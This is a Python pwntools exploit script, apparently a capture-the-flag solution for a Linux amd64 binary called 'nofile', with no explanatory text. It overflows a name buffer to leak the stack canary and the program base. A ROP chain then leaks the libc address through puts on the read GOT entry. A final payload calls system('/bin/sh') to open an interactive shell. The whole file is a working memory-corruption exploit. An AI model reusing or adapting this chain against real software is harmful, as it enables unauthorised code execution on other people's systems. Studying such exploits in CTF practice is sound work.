#coding:utf-8

from pwn import *

context(os='linux',arch='amd64')
context.log_level = 'debug'
#p=remote('10.112.100.47',6135)
p = process('./nofile')
P = ELF('./nofile')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

p.recvuntil('2,3or4?\n')
p.sendline(str(24))
p.recvuntil('Name?\n')

payload = 'a'*0x18
p.send(payload+'\x33')
p.recvuntil('\x33')
canary = u64(p.recv(7).ljust(8,'\x00'))
canary = str(hex(canary)) + '00'
canary = int(canary,16)
log.success('canary = '+hex(canary))
base = u64(p.recv(6).ljust(8,'\x00')) - 0xd80
log.success('base = '+hex(base))

p_rdi = base + 0xde3
p_r15 = base + 0xde2
p_rsi_r15 = base + 0xde1
vul_addr = base + 0xc13
bss = base + 0x202a00
main = base+0xc94
start = base+0x980

#gdb.attach(p)
p.sendline('n')
p.recvuntil('Length?\n')
p.sendline(str(71))
p.recvuntil('Name?\n')
payload1 = 'a'*0x18 + p64(canary) + p64(bss)
payload1+= p64(p_rdi)
payload1+= p64(P.got['read']+base)
payload1+= p64(P.plt['puts']+base) 
payload1+= p64(main)
p.send(payload1)

libcbase = u64(p.recv(6).ljust(8,'\x00'))-libc.sym['read']
log.success('libcbase = '+hex(libcbase))
system_addr = libcbase + libc.sym['system']
log.success('system_addr = '+hex(system_addr))
sh_addr = libcbase + libc.search('/bin/sh\x00').next()
log.success('sh_addr = '+hex(sh_addr))

#gdb.attach(p)
p.recvuntil('2,3or4?\n')
p.sendline(str(63))
p.recvuntil('Name?\n')
payload2 = p64(0)*3+p64(canary)
payload2+= p64(bss)+p64(p_rdi)+p64(sh_addr)+p64(system_addr)
p.send(payload2)
#gdb.attach(p)

p.recvuntil('Right?\n')
p.sendline('y')

p.interactive()



